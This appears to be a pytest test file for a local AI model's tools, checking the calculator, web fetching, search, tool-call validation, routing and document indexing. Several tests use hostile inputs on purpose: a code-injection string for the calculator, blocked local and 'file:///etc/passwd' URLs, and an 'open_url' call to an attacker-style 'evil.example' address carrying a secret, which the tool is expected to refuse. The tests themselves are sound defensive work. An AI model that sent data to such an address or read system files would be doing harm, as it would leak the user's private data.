import pytest

from core.config import Config
from core.lang import guess_language
from core.router import route
from core.toolcall import ToolCall
from knowledge.docs_index import chunk_text
from tools.calc import calculate
from tools.fetch import BlockedURL, check_url, html_to_text
from tools.registry import CALCULATOR, WEB_SEARCH, ToolContext, execute, validate
from tools.search import sanitize_query

CFG = Config({"search": {"enabled": True, "searxng_url": "http://127.0.0.1:1"}, "user": {"name": "Lea"}})


def test_calculator():
    assert calculate("17% * 2340") == "397.8"
    assert calculate("2^10") == "1024"
    assert calculate("max(1,2)") == "2"
    assert calculate("1,5*2") == "3"
    assert calculate("10 mod 3") == "1"
    assert calculate("__import__('os')").startswith("Error")
    assert calculate("2**99999").startswith("Error")


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:8765/api/memory",
        "http://localhost/x",
        "file:///etc/passwd",
        "http://192.168.1.1/",
        "http://[::1]/",
    ],
)
def test_fetch_blocks_local_urls(url):
    with pytest.raises(BlockedURL):
        check_url(url)


def test_html_to_text_skips_scripts_and_menus():
    title, text = html_to_text(
        "<html><head><title>Hi</title><script>evil()</script></head><body><nav>Home About</nav>"
        "<p>This is the real article content of the page.</p></body></html>"
    )
    assert title == "Hi" and "real article" in text and "evil" not in text and "Home About" not in text


def test_search_query_strips_name():
    assert sanitize_query("Lea's university Madrid ranking", ["Lea"]) == "university Madrid ranking"


def test_validate_tool_calls():
    tools = [WEB_SEARCH, CALCULATOR]
    assert validate(ToolCall("web_search", {"query": "x"}), tools) is None
    assert "Missing" in validate(ToolCall("web_search", {}), tools)
    assert "Unknown tool" in validate(ToolCall("send_email", {"to": "a"}), tools)
    assert "Unknown parameter" in validate(ToolCall("calculator", {"expression": "1", "x": 2}), tools)


def test_open_url_only_for_allowed_urls():
    ctx = ToolContext(cfg=CFG, user_text="summarize https://example.com/a")
    r = execute(ToolCall("open_url", {"url": "https://evil.example/?data=secret"}), ctx)
    assert r.content.startswith("Refused")


def test_web_search_unavailable_is_graceful():
    r = execute(ToolCall("web_search", {"query": "weather"}), ToolContext(cfg=CFG))
    assert not r.ok and "unavailable" in r.content


def test_router():
    assert not route("hola, ¿qué tal?", battery=False).thinking
    assert route("think step by step: is this right?", battery=False).thinking
    assert route("Compute the NPV of these cash flows at 8%", battery=False).thinking
    assert not route("Compute the NPV of these cash flows at 8%", battery=True).thinking
    assert route("piénsalo bien", battery=True).thinking


def test_language_guess():
    assert guess_language("¿Qué tiempo hace hoy en Madrid?") == "es"
    assert guess_language("Qu'est-ce que tu penses de ça ?") == "fr"
    assert guess_language("Un hexagone a 6 côtés.") == "fr"
    assert guess_language("Un hexagone a **6 côtés**.") == "fr"
    assert guess_language("What's the weather like today?") == "en"


def test_chunking():
    text = ("Sentence number one. " * 200).strip()
    chunks = chunk_text(text, size=500, overlap=100)
    assert all(len(c) <= 500 for c in chunks) and len(chunks) > 5


def test_docs_index_and_search_documents_tool(tmp_path):
    from core.db import Database
    from knowledge.docs_index import DocsIndex
    from knowledge.embeddings import HashEmbedder

    folder = tmp_path / "course"
    folder.mkdir()
    (folder / "finance.md").write_text(
        "# Corporate finance\n\nThe WACC is the weighted average cost of capital."
    )
    (folder / "biology.txt").write_text("Mitochondria are the powerhouse of the cell.")
    (folder / "image.png").write_bytes(b"\x89PNG")
    db = Database(tmp_path / "d.db", dim=256)
    idx = DocsIndex(db, HashEmbedder(256))
    assert idx.index_folders([str(folder)]) == {"files": 2, "chunks": 2, "errors": 0}
    assert idx.index_folders([str(folder)])["chunks"] == 0  # unchanged files are skipped
    ctx = ToolContext(cfg=CFG, docs=idx)
    r = execute(ToolCall("search_documents", {"query": "what is the WACC"}), ctx)
    assert "finance.md" in r.content and "<untrusted>" in r.content and r.sources[0]["n"] == 1
    (folder / "biology.txt").unlink()
    idx.index_folders([str(folder)])
    assert idx.stats() == {"documents": 1, "chunks": 1}
    assert (folder / "finance.md").exists()  # the index never touches Lea's files


def test_searxng_retries_once_when_every_engine_timed_out():
    from tools.search import searxng

    class R:
        def __init__(self, data):
            self.data = data

        def raise_for_status(self):
            pass

        def json(self):
            return self.data

    cold = {"results": [], "unresponsive_engines": [["duckduckgo", "timeout"], ["wikipedia", "timeout"]]}
    warm = {"results": [{"title": "uv", "url": "https://docs.astral.sh/uv/", "content": "fast"}]}
    replies, calls = [cold, warm], []

    def get(url, params, timeout):
        calls.append(params["q"])
        return R(replies.pop(0))

    assert searxng("http://x", "uv", get=get)[0]["url"] == "https://docs.astral.sh/uv/"
    assert len(calls) == 2
    # no results for another reason (e.g. nothing found): no retry
    calls.clear()
    replies[:] = [{"results": [], "unresponsive_engines": [["brave", "too many requests"]]}]
    assert searxng("http://x", "zzz", get=get) == [] and len(calls) == 1


def test_searxng_autostart_only_when_installed_and_local(tmp_path):
    from tools.search import start_searxng

    cfg = Config({"paths": {"data_dir": str(tmp_path)}, "search": {"searxng_url": "http://127.0.0.1:1"}})
    assert start_searxng(cfg) == "not installed"
    remote = Config(
        {"paths": {"data_dir": str(tmp_path)}, "search": {"searxng_url": "https://search.example"}}
    )
    assert start_searxng(remote) == "not local"
